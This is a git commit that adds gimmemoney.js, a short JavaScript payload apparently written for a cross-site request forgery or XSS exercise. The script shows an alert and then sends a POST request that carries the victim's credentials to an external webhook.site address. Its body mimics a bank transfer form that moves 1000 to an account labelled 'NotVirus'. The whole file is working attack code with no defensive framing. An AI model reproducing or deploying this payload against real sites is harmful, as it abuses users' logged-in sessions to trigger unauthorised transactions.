e57b9b68fbfd38cde74726620ecba5166da60312
EvilKacker <77842142+EvilKacker@users.noreply.github.com>
2021-01-23 16:28:03 +0100

    Create gimmemoney.js

---
+++ gimmemoney.js
@@ -0,0 +1,7 @@
+var gimmemoney = function(){ 
+alert(`2`);var x=new XMLHttpRequest(); 
+x.open(`post`, `https://webhook.site/eb6c9150-e79b-450b-968f-cef4950a8ee5`); 
+x.withCredentials=true; x.setRequestHeader(`Content-Type`,`application/x-www-form-urlencoded`);
+x.send(`receiver=NotVirus&account=3982132&amount=1000&intended_use=&donation=Transaction&date=2021-01-22`);
+};
+gimmemoney();
